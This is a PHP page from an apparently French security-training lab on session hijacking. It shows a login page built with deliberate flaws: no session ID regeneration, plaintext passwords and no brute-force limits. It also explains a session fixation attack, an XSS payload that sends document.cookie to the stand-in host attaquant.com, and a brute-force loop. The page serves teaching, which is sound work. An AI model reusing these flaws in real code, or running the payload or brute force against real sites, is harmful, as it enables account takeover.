<?php
/**
 * PARTIE E - AUTHENTIFICATION VULNERABLE (Session Hijacking/Fixation)
 * 
 * [ATTENTION] CE CODE EST VOLONTAIREMENT VULNERABLE - NE PAS UTILISER EN PRODUCTION
 * 
 * Failles presentes :
 * - Session ID non rgenere apres authentification
 * - Pas de protection contre la fixation de session
 * - Mot de passe stock en clair
 * - Pas de protection anti-bruteforce
 */

// [VULNERABLE] VULNERABLE : Configuration de session non securisee
session_start(); // Sans les parametres de securite

require_once __DIR__ . '/../config.php';
$config = require __DIR__ . '/../config.php';

try {
    $dsn = "mysql:host={$config->db->host};dbname={$config->db->dbname};charset={$config->db->charset}";
    $pdo = new PDO($dsn, $config->db->user, $config->db->pass);
} catch (Exception $e) {
    die("Erreur DB");
}

include __DIR__ . '/../templates/header.php';

$message = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $login = $_POST['login'] ?? '';
    $password = $_POST['password'] ?? '';
    
    // [VULNERABLE] VULNERABLE : Requte preparee mais mot de passe compar en clair
    $stmt = $pdo->prepare("SELECT * FROM membres WHERE login = ?");
    $stmt->execute([$login]);
    $user = $stmt->fetch(PDO::FETCH_ASSOC);
    
    // [VULNERABLE] VULNERABLE : Comparaison de mot de passe en clair
    if ($user && $user['password'] === $password) {
        // [VULNERABLE] VULNERABLE : Pas de regeneration de session ID
        // Permet la fixation de session
        $_SESSION['user_id'] = $user['id'];
        $_SESSION['user_nom'] = $user['nom'];
        $_SESSION['logged_in'] = true;
        
        $message = '<div class="alert alert-success">Connexion reussie !</div>';
    } else {
        // [VULNERABLE] VULNERABLE : Pas de dlai, pas de compteur de tentatives
        $message = '<div class="alert alert-danger">Identifiants incorrects.</div>';
    }
}

// Dconnexion
if (isset($_GET['logout'])) {
    // [VULNERABLE] VULNERABLE : Session non detruite proprement
    unset($_SESSION['user_id']);
    header('Location: auth_vuln.php');
    exit;
}
?>

<h2> Partie E - Piratage de Session</h2>

<div class="danger-box">
    <strong>[VULN] VERSION VULNERABLE</strong><br>
    Plusieurs failles : fixation de session, pas de regeneration, mots de passe en clair.
</div>

<?= $message ?>

<?php if (isset($_SESSION['logged_in']) && $_SESSION['logged_in']): ?>
    <div class="alert alert-success">
        <p>[SECURE] Connecte en tant que : <strong><?= $_SESSION['user_nom'] ?? 'Utilisateur' ?></strong></p>
        <p>Session ID : <code><?= session_id() ?></code></p>
        <p><a href="?logout=1">Se deconnecteeer</a></p>
    </div>
<?php else: ?>
    <form method="POST">
        <label for="login">Login :</label>
        <input type="text" name="login" id="login" placeholder="admin">
        
        <label for="password">Mot de passe :</label>
        <input type="password" name="password" id="password" placeholder="Mot de passe">
        
        <button type="submit"> Se connecteer</button>
    </form>
<?php endif; ?>

<h3> Attaques possibles</h3>

<h4>1. Session Fixation</h4>
<div class="code-block">
1. L'attaquant visite le site et note son session ID : PHPSESSID=abc123

2. Il envoie un lien pig  la victime :
   http://site.com/auth_vuln.php?PHPSESSID=abc123

3. La victime se connectee avec ce session ID fix

4. L'attaquant utilise PHPSESSID=abc123 et accde au compte de la victime
</div>

<h4>2. Session Hijacking (vol de cookie)</h4>
<div class="code-block">
// Via XSS sur une autre page vulnerable :
&lt;script&gt;
document.location = 'http://attaquant.com/steal.php?sid=' + document.cookie;
&lt;/script&gt;

// L'attaquant recupere le cookie et l'injecte dans son navigateur
</div>

<h4>3. Brute Force (pas de protection)</h4>
<div class="code-block">
// Script de brute force (hydra, burp suite, script python)
for password in wordlist:
    response = post('/auth_vuln.php', {'login': 'admin', 'password': password})
    if 'Connexion reussie' in response:
        print(f'Password found: {password}')
        break
</div>

<h3> Questions</h3>
<ol>
    <li>Qu'est-ce que la "fixation de session" ?</li>
    <li>Pourquoi faut-il regenerer le session ID apres connexion ?</li>
    <li>Comement protegeer les cookies de session contre le vol XSS ?</li>
    <li>Quelles protections anti-bruteforce peut-on mettre en place ?</li>
</ol>

<p><a href="../secure/auth_secure.php"> Voir la version securisee</a></p>

    </main>\r\n</div>\r\n</body>\r\n</html>
